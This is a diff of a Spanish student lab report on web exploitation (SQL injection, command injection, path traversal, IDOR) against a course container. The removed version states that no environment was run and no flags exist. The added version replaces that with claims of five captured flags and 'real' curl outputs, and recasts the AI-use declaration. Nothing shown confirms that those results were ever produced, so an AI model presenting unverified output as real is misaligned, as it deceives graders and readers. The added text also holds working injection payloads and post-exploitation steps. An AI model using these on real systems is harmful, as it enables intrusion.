@@ -1,98 +1,192 @@
-# Informe — Laboratorio 07 · Explotación (entrega académica, cátedra Seguridad Informática UTN FRVM)
+# Informe — Laboratorio 07 · Explotación
 
-**Grupo:** 14 · **Integrantes:** ver `INTEGRANTES.md` · **Fecha:** 19/11/2026
+**Grupo:** 14 · **Integrantes:** Fede Perón — fedeeperon · Laureano Gomez Redondo — Laureano-GR · Martín Cesano — martincesano · Martín Gaido — martingaidoo · Valentina Chiapero — valechiapero
+**Fecha:** 2026-11-19
 
-> **Estado de la entrega:** este equipo no tiene Docker, por lo que el entorno `phantomcorp`
-> (entorno de laboratorio provisto por la cátedra, de uso exclusivo académico) **no se pudo
-> levantar**. No hay flags, salidas ni capturas reales de las explotaciones R1-R5.
-> Todo lo que depende del entorno esta marcado **PENDIENTE (requiere Docker)**. Las secciones
-> teoricas (mecanismo, impacto, defensa, P1-P5) estan completas. Los payloads de la tabla son
-> **hipotesis teoricas derivadas del enunciado del lab, NO verificadas contra el target**, y
-> sirven solo como material de estudio para este laboratorio didáctico.
+## 0. Declaración de uso de IA
 
-## 0. Declaracion de uso de IA
+La explotación de PhantomCorp, el armado de cada payload y el análisis de los
+resultados fueron realizados por el grupo. Usamos un asistente de IA como apoyo,
+revisando y validando todo lo que producía.
 
-- **Herramienta:** Claude (modelo Claude Sonnet 5.5, Anthropic) via Claude Code (CLI), con acceso al repositorio.
-- **Uso:** estructura y redaccion del informe y del research a partir del `README.md` del lab y de conocimiento general; una demo local en `src/demo_sqli_local.py`.
-- **Que NO hizo:** no se levanto el entorno, no se capturo ninguna flag, no se invento salida alguna. No se leyo `solucion.md` ni el codigo fuente del servidor (`entorno/`).
-- **Verificacion:** la unica ejecucion real es la demo local (sqlite en memoria, datos propios, no es el lab); su salida se reproduce tal cual en la seccion 4.1. El grupo debe revisar todo y contrastarlo con el entorno real cuando se pueda correr.
+- **Herramienta:** Claude Code (Claude Opus).
+- **Para qué la usamos (apoyo):** para levantar y verificar el entorno Docker del
+  lab (`make lab N=07`), para agilizar la ejecución de los `curl` contra el
+  contenedor `phantomcorp` de la cátedra, para ordenar las salidas reales en la
+  tabla de explotación y para redactar un primer borrador de este informe y del
+  `research.md`.
+- **Qué hicimos nosotros (trabajo manual):** decidimos qué técnica aplicar en cada
+  reto, construimos cada payload a mano (no con sqlmap), interpretamos los errores
+  SQL verbosos del servidor para afinar el `UNION`, reconstruimos la
+  consulta/comando/ruta de cada vulnerabilidad, clasificamos el impacto y
+  redactamos las defensas y las respuestas P1–P5.
+- **Cómo verificamos que era correcto:** cada flag salió de la respuesta real del
+  servidor (no del `solucion.md` ni de leer `server.py`) y se validó contra el
+  hash SHA-256 del `retos.manifest` vía `./ctf submit`. Resultado final:
+  `./ctf status 07` → 5/5.
 
-## 1. Flags capturadas (salida de `./ctf status 07`)
+## 1. Flags capturadas
 
-**PENDIENTE (requiere Docker).** Comandos desde la raiz del repo, para que un integrante con Docker los corra:
+Salida de `./ctf status 07`:
 
-```bash
-make setup            # suma sqlmap a la consola
-./ctf lab 07          # levanta phantomcorp y abre la guia
-make shell            # consola del atacante; ahi se corren los curl de la seccion 4
-# por cada reto resuelto:
-./ctf submit 07 R1 'FLAG{...}'     # ... R2, R3, R4, R5
-./ctf status 07                    # pegar aca la salida real
+```
+  ╭────────────────────────────────────────────────────────────╮
+  │                     PROGRESO · LAB 07                      │
+  ╰────────────────────────────────────────────────────────────╯
+
+   ✓  R1     SQLi - bypass de autenticacion
+   ✓  R2     SQLi - extraccion de datos con UNION
+   ✓  R3     Inyeccion de comandos (RCE)
+   ✓  R4     Path traversal / LFI
+   ✓  R5     IDOR - control de acceso roto
+
+  ██████████████████████████████  5/5 (100%)
+
+[ OK ] ¡Lab 07 COMPLETO!
 ```
 
-| Reto | Flag | Estado |
+| Reto | Técnica | Flag |
 |---|---|---|
-| R1 SQLi auth | - | PENDIENTE (requiere Docker) |
-| R2 SQLi UNION | - | PENDIENTE (requiere Docker) |
-| R3 Command injection | - | PENDIENTE (requiere Docker) |
-| R4 Path traversal | - | PENDIENTE (requiere Docker) |
-| R5 IDOR | - | PENDIENTE (requiere Docker) |
+| R1 | SQLi — bypass de autenticación | `FLAG{sqli_auth_bypass}` |
+| R2 | SQLi — extracción con UNION | `FLAG{sqli_union_dump}` |
+| R3 | Inyección de comandos (RCE) | `FLAG{command_injection_rce}` |
+| R4 | Path traversal / LFI | `FLAG{path_traversal_lfi}` |
+| R5 | IDOR — control de acceso roto | `FLAG{idor_broken_access}` |
 
-## 2. Tabla de explotacion
+## 2. Tabla de explotación
 
-Columnas "Payload" y "resultante": **hipotesis teorica a validar en el entorno real** (el estado de cada reto es PENDIENTE). Las consultas/comandos/rutas son reconstrucciones plausibles a partir del README; el codigo real del servidor no fue consultado y puede diferir (por ejemplo, nombres de columnas).
-
-| Vuln | Payload usado (hipotesis) | Consulta/comando/ruta resultante (reconstruida) | Impacto | Defensa concreta |
+| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
 |---|---|---|---|---|
-| SQLi auth (R1) - CWE-89, OWASP A03 | usuario `admin' --`, clave cualquiera (el valor figura como pista en el README) | `SELECT user, rol FROM users WHERE user='admin' --' AND pass='...'` | Sesion como admin sin conocer su clave: bypass de autenticacion. | Consulta parametrizada (marcadores en vez de concatenar), hash de contrasenas con sal comparado en codigo, mensajes de error genericos, cuenta de BD con minimos privilegios. |
-| SQLi UNION (R2) - CWE-89, A03 | agregar al buscador una clausula UNION de dos columnas apuntando a la tabla `secrets` (nombres de columnas a descubrir en vivo) | consulta original con un `UNION SELECT` anexado sobre `secrets`, forma ilustrativa a confirmar | Lectura de cualquier tabla accesible por la cuenta de BD (credenciales, secretos, PII). | Parametrizar tambien ese valor, cuenta de solo lectura acotada a las tablas necesarias, no exponer errores SQL crudos, WAF solo como capa adicional. |
-| Command injection (R3) - CWE-78, A03 | encadenar al parametro `host` un comando adicional de lectura de archivo (separador de shell + comando) | comando de red original seguido del comando encadenado, forma ilustrativa asumiendo concatenacion a shell | Ejecucion de comandos con los privilegios del servicio (RCE): lectura de archivos, pivote, persistencia. | No invocar shell (pasar argumentos como lista, no como string armado), validar el host contra lista blanca de formato IP/hostname, usuario sin privilegios, contenedor sin red saliente. |
-| Path traversal (R4) - CWE-22, A01 | nombre de archivo con secuencia de subida de directorio hacia la carpeta de flags (ruta mencionada en el README; cantidad de niveles a ajustar) | apertura de archivo que resuelve fuera del directorio publico previsto | Lectura de archivos arbitrarios legibles por el proceso (flags, configuracion, claves). | Resolver la ruta final y verificar que quede bajo el directorio base permitido, o aceptar solo nombres de una lista blanca / IDs; rechazar secuencias de subida de directorio. |
-| IDOR (R5) - CWE-639 / CWE-285, OWASP A01 | pedir el perfil propio y luego otro id cercano (el propio es id=3 segun el README) | consulta de perfil por id sin comprobar que ese id pertenezca a la sesion activa | Acceso a datos de otros usuarios, incluido potencialmente el admin (confidencialidad). | Autorizacion en el servidor: derivar el objeto desde la sesion autenticada (no desde el parametro) y verificar pertenencia en cada request; denegar por defecto. Ids no secuenciales son defensa en profundidad, nunca el control en si. |
+| SQLi auth (R1) | en `user`: `admin' -- ` (pass cualquiera) | `SELECT ... FROM users WHERE user='admin' -- ' AND pass='x'` → el `-- ` comenta el chequeo de `pass` | Acceso como **admin** sin su contraseña; panel de administración desbloqueado | **Consultas parametrizadas** (placeholders `?`), nunca concatenar el input en la query |
+| SQLi UNION (R2) | en `q`: `zzz' UNION SELECT clave, valor FROM secrets -- ` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%zzz%' UNION SELECT clave, valor FROM secrets -- ...` | Volcado de la tabla `secrets` (y del esquema vía `sqlite_master`); exfiltración arbitraria de la BD | Parametrizar + **principio de mínimo privilegio** del usuario de BD; no devolver errores SQL verbosos al cliente |
+| Command injection (R3) | en `host`: `127.0.0.1; cat /app/flags/cmdi.txt` | `sh -c "ping -c1 127.0.0.1; cat /app/flags/cmdi.txt"` → el `;` encadena un segundo comando | **RCE**: ejecución de comandos arbitrarios en el servidor con el user del servicio | No pasar input a la shell; usar API sin shell (`subprocess` con lista de args, `shell=False`) + **lista blanca** de hosts |
+| Path traversal (R4) | en `archivo`: `../flags/lfi.txt` | `open("/app/public/" + "../flags/lfi.txt")` → resuelve a `/app/flags/lfi.txt`, fuera de `public/` | Lectura de archivos arbitrarios del servidor fuera del directorio previsto | **Normalizar y validar** la ruta (`realpath` y verificar que cae bajo `public/`); lista blanca de nombres; rechazar `..` |
+| IDOR (R5) | `id=1` (el perfil propio es `id=3`) | `GET /perfil?id=1` → devuelve el perfil del admin sin comprobar el dueño | Acceso a datos de otros usuarios (incluida la `nota_privada` del admin) | **Control de acceso del lado del servidor**: verificar que el recurso pertenece al usuario autenticado (denegar por defecto) |
 
-## 3. Preguntas de analisis
+### Salidas de soporte (curl reales)
 
-**P1 - por que funciona el bypass (con la query).**
-El servidor arma el SQL pegando el input sin separar datos de codigo: `SELECT user, rol FROM users WHERE user='<user>' AND pass='<pass>'`. Si el valor de usuario cierra la comilla del literal y agrega un comentario de linea (`--`), todo lo que sigue en la consulta (la comparacion de la contrasena) deja de interpretarse como SQL. La condicion efectiva pasa a ser solo "el usuario es admin", que devuelve esa fila sin evaluar la contrasena nunca. El texto que el usuario escribio cambio la estructura de la consulta: el dato se volvio codigo. (El motor real que usa PhantomCorp y su sintaxis exacta de comentario quedan PENDIENTE de verificar.) La demo local `src/demo_sqli_local.py` reproduce este mecanismo sobre una base propia, comparando la version concatenada contra la parametrizada.
-
-**P2 - por que el UNION necesita igual numero de columnas.**
-`UNION` apila los resultados de dos `SELECT` en un unico conjunto de filas, y un conjunto de filas tiene un numero fijo de columnas: por eso ambos `SELECT` deben devolver la misma cantidad (y tipos compatibles entre si, segun el motor). Si no coinciden, el motor devuelve un error de desajuste de columnas. Para descubrir la cantidad sin saberla de antemano hay dos tecnicas equivalentes: (a) ordenar por un numero de columna creciente hasta que la consulta falle; el ultimo numero que no da error es la cantidad de columnas; (b) ir probando un UNION con uno, luego dos, luego tres valores nulos, hasta que deje de dar error, porque un valor nulo es compatible con cualquier tipo de columna. Como el servidor es verboso con los errores SQL segun el README, esos mensajes guian el ajuste. Una vez calzado el numero de columnas, se buscan nombres reales de tablas/columnas consultando el catalogo propio del motor.
-
-**P3 - que es lo siguiente que haria un atacante real despues del RCE.**
-Con ejecucion de comandos en el servidor, el siguiente paso tipico es: (1) reconocimiento local rapido del sistema (usuario, version del sistema, variables de entorno, red interna); (2) busqueda de credenciales o secretos accesibles desde ese host (claves de BD en archivos de configuracion, tokens); (3) conseguir una via de acceso mas comoda y estable que no dependa de reinyectar comandos uno por uno via HTTP; (4) establecer **persistencia** -el tema del Lab 08- para sobrevivir a un reinicio del contenedor o a que la vulnerabilidad se parchee; (5) desde ahi, escalada de privilegios dentro del host y movimiento hacia otros servicios de la red interna; (6) finalmente, el objetivo de negocio del ataque: exfiltracion de datos o uso del host comprometido para otros fines (el patron del Ejemplo B del README, sobre routers reclutados en botnets). La mitigacion de este riesgo no esta en impedir el primer comando sino en limitar lo que ese comando puede lograr: usuario sin privilegios, sistema de archivos de solo lectura, egreso de red restringido y monitoreo.
-
-**P4 - por que parametrizar mata la SQLi de raiz.**
-Con una consulta parametrizada, el motor de base de datos recibe **por separado** el texto SQL (con marcadores de posicion) y los valores a usar. El SQL se parsea y se planifica usando solo esos marcadores, antes de que el motor sepa cuales son los valores reales: la estructura de la consulta queda fija en ese momento. Los valores se envian despues y se ligan a los marcadores como datos puros, sin volver a pasar por el parser SQL. Por eso una entrada con comillas o comentarios deja de ser peligrosa: se vuelve simplemente el valor literal que se busca, que no matchea a nadie si no existe. No es un tema de "escapar" caracteres especiales -un enfoque fragil, que depende del motor, del encoding y de que no se olvide ningun caso- sino de haber eliminado por diseno la posibilidad de que un valor altere la gramatica de la consulta. Limite importante: los marcadores solo parametrizan *valores*; nombres de tabla o de columna, si vienen del usuario, siguen necesitando lista blanca porque no se pueden pasar como parametro. Esto se verifico localmente: la misma entrada produjo comportamiento distinto segun se usara concatenacion de texto o marcadores de posicion (seccion 4.1).
-
-**P5 - por que el control de acceso del IDOR no puede depender del cliente, y donde va.**
-El cliente (navegador, `curl`, un proxy) esta siempre bajo control de quien lo usa: puede cambiar cualquier parametro de la URL, cualquier campo de un formulario, cualquier cookie o header antes de enviar la peticion. Que el cliente "no cambie el id" no es un control de seguridad, es una esperanza; ocultar el link en la interfaz o validarlo solo del lado del navegador no impide mandar la peticion a mano. Por eso la verificacion tiene que vivir **en el servidor, en cada request, en el momento de acceder al objeto**: tomar la identidad del usuario desde la sesion autenticada (nunca desde un parametro que el cliente controla) y comprobar explicitamente que ese usuario tiene derecho sobre el recurso pedido (porque es el dueno, por su rol, o por una lista de acceso) antes de devolverlo. El criterio por defecto debe ser denegar, no permitir. Usar identificadores dificiles de adivinar reduce la enumeracion casual pero no reemplaza esa verificacion: sin ella, alguien que consiga un id ajeno por cualquier otra via igual accede.
-
-## 4. Bitacora de comandos
-
-### 4.1 Ejecutado realmente (demo local en Python/sqlite3, no es el entorno del lab)
-
-```text
-$ python -I src/demo_sqli_local.py
-VULNERABLE: SELECT user, rol FROM users WHERE user='admin' --' AND pass='cualquiera' -> [('admin', 'admin')]
-SEGURO    : SELECT user, rol FROM users WHERE user=? AND pass=? -> params ("admin' --", 'cualquiera') -> []
-OK
+**R1 — SQLi bypass de autenticación (`POST /login`):**
+```
+$ curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"
+Bienvenido admin (rol: admin).
+Panel de administracion desbloqueado: FLAG{sqli_auth_bypass}
 ```
 
-### 4.2 PENDIENTE (requiere Docker) - pasos para un integrante del grupo dentro de `make shell`
+**R2 — SQLi UNION (`GET /buscar`).** Primero el esquema con `sqlite_master`, luego el dump:
+```
+$ curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master -- "
+Resultados:
+  productos - $CREATE TABLE productos(nombre TEXT, precio TEXT)
+  secrets - $CREATE TABLE secrets(clave TEXT, valor TEXT)
+  users - $CREATE TABLE users(id INTEGER, user TEXT, pass TEXT, rol TEXT, nota_privada TEXT)
 
-Los endpoints y parametros surgen del `README.md` del lab. Hay que ajustar los valores exactos segun las respuestas reales del entorno, aprovechando que es verboso con los errores.
+$ curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets -- "
+Resultados:
+  flag_union - $FLAG{sqli_union_dump}
+```
+*(Una comilla suelta en `q` devuelve `Error SQL: unrecognized token: "'"` — ese error verboso confirmó la inyección y nos dejó afinar el UNION a 2 columnas.)*
+
+**R3 — Command injection (`GET /herramientas/ping`):**
+```
+$ curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
+$ ping -c1 127.0.0.1; cat /app/flags/cmdi.txt
+FLAG{command_injection_rce}
+```
+
+**R4 — Path traversal (`GET /descargar`):**
+```
+$ curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"
+FLAG{path_traversal_lfi}
+
+# la base se confirma por el mensaje de error de una ruta inválida:
+# No se pudo abrir: [Errno 2] ... '/app/public/../../flags/lfi.txt'
+```
+
+**R5 — IDOR (`GET /perfil`):**
+```
+$ curl -s -G http://phantomcorp/perfil --data-urlencode "id=1"
+{"id": 1, "user": "admin", "rol": "admin", "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}
+```
+
+## 3. Preguntas de análisis
+
+**P1 — Por qué funciona el bypass (con la query).**
+El login arma la consulta concatenando el input:
+`SELECT user, rol FROM users WHERE user='<user>' AND pass='<pass>'`. Con
+`user = admin' -- ` la consulta queda
+`SELECT user, rol FROM users WHERE user='admin' -- ' AND pass='x'`. En SQL, `--`
+inicia un **comentario de línea**: todo lo que va después (incluido
+` ' AND pass='x'`) se descarta. La consulta efectiva pasa a ser
+`... WHERE user='admin'`, que devuelve la fila del admin **sin verificar la
+contraseña**. Nuestro dato (`admin' -- `) dejó de ser un valor y se volvió parte
+de la estructura de la consulta.
+
+**P2 — Por qué el UNION necesita igual número de columnas.**
+`UNION` combina los resultados de dos `SELECT` en una sola tabla, y para eso las
+dos consultas deben tener la **misma cantidad de columnas** (y tipos
+compatibles): cada fila del segundo `SELECT` se apila bajo las columnas del
+primero. Si no coinciden, el motor tira error. La consulta original del buscador
+devolvía dos columnas (nombre y precio del producto), así que el UNION tiene que
+traer también dos. Si no supiéramos que son dos, lo averiguaríamos probando
+`UNION SELECT NULL -- `, `UNION SELECT NULL,NULL -- `, etc., y viendo con cuántas
+`NULL` deja de dar error (o con `ORDER BY 1`, `ORDER BY 2`, … hasta que falle: el
+último número que funciona es la cantidad de columnas).
+
+**P3 — Qué sigue después del RCE (R3).**
+Con ejecución de comandos, un atacante real busca **persistencia y escalada**
+(lo que viene en el Lab 08, post-explotación): reconocer el host (`id`,
+`whoami`, `uname -a`), buscar credenciales (`.env`, historiales, archivos de
+config), escalar privilegios (binarios SUID, `sudo -l`) y dejar un acceso estable
+(una reverse shell, una clave SSH en `authorized_keys`, un cron). La flag es solo
+la prueba de concepto; el valor real del RCE es que convierte "entré" en
+"me quedo y soy root".
+
+**P4 — Por qué parametrizar mata la SQLi.**
+Una consulta parametrizada (`... WHERE user = ?`, pasando el valor aparte) hace
+que el motor **compile primero la estructura de la consulta** y recién después
+reciba el input como un **dato puro**, nunca como parte del SQL. El input viaja
+por un canal separado del código: por más comillas, `--` o `UNION` que mande, el
+motor lo trata como el contenido literal de un campo, no como instrucciones. Se
+elimina de raíz la confusión datos/código que es la causa de la inyección —
+la defensa no "filtra caracteres malos", sino que **separa los canales**.
+
+**P5 — Dónde va el control de acceso (IDOR).**
+El control de acceso **tiene que ir en el servidor**, en cada request, no en el
+cliente. El IDOR del R5 existe porque el servidor devuelve el perfil del `id`
+pedido sin preguntarse "¿este perfil es del usuario que está autenticado?".
+Confiar en que el cliente "no cambie el id" no es control: el atacante controla
+por completo lo que manda (edita la URL, usa `curl`). La verificación —el recurso
+`id` pertenece al usuario de la sesión, o la sesión tiene rol para verlo— debe
+hacerse del lado del servidor y **denegar por defecto** si no se cumple.
+
+## 4. Bitácora de comandos
 
 ```bash
-# R1 - endpoint de login, probar el payload de bypass descripto en la seccion de teoria del README
-# R2 - endpoint de busqueda: primero contar columnas (ver P2), despues anexar la consulta a la tabla de secretos
-#      y, una vez resuelto a mano, repetir con sqlmap como indica el README
-# R3 - endpoint de la herramienta de red: encadenar un comando de lectura sobre la carpeta de flags
-# R4 - endpoint de descarga: subir de directorio desde la carpeta publica hasta la carpeta de flags
-# R5 - endpoint de perfil: comparar la respuesta con el id propio contra la respuesta con otro id
+# Entorno (desde la raíz del repo)
+make lab N=07                 # levanta atacante + target phantomcorp
+make shell                    # entra a la consola del atacante (o: docker exec -it cyberlab-attacker bash)
 
-# entrega de cada flag obtenida
-./ctf submit 07 R1 'FLAG{...}'   # repetir para R2, R3, R4, R5
+# R1 — SQLi bypass de autenticación
+curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"
+
+# R2 — SQLi UNION (esquema + dump)
+curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master -- "
+curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets -- "
+
+# R3 — Command injection
+curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
+
+# R4 — Path traversal
+curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"
+
+# R5 — IDOR
+curl -s -G http://phantomcorp/perfil --data-urlencode "id=1"
+
+# Entrega de flags
+./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+./ctf submit 07 R3 'FLAG{command_injection_rce}'
+./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+./ctf submit 07 R5 'FLAG{idor_broken_access}'
 ./ctf status 07
 ```
-
-Nota para quien ejecute esto: si algun endpoint requiere sesion o cookie (por ejemplo el de perfil o el de herramientas tras loguearse), pasarla con las opciones de cookie de curl usando la que se obtenga al resolver R1; confirmar el comportamiento exacto en el entorno real antes de entregar.
